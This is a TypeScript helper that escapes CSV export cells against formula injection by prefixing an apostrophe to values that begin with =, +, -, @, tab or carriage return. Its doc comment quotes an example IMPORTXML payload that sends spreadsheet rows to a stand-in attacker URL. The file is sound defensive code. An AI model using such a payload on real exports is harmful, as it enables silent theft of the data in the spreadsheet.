/**
 * One cell of an exported CSV, safe to open in Excel, Google Sheets or LibreOffice.
 *
 * Quoting a cell is not enough. A spreadsheet runs any cell that starts with
 * = + - @ (or a tab or carriage return) as a formula, whatever the quotes
 * around it, so a sign-up name or a trade field such as
 * =IMPORTXML(CONCAT("https://attacker/?",A2:A500),"//a") would execute in the
 * administrator's spreadsheet and could send every other row off the machine.
 * Those fields reach the exports without an account, so a leading apostrophe
 * marks the cell as text before it is quoted. OWASP's guidance for CSV
 * injection is the same.
 *
 * Leading whitespace is looked past, because some spreadsheet importers trim it.
 */
const FORMULA_TRIGGER = /^\s*[=+\-@]|^[\t\r]/;

export const csvCell = (value: unknown): string => {
  if (value === null || value === undefined) return '""';
  let text = String(value);
  if (FORMULA_TRIGGER.test(text)) text = `'${text}`;
  return `"${text.replace(/"/g, '""')}"`;
};
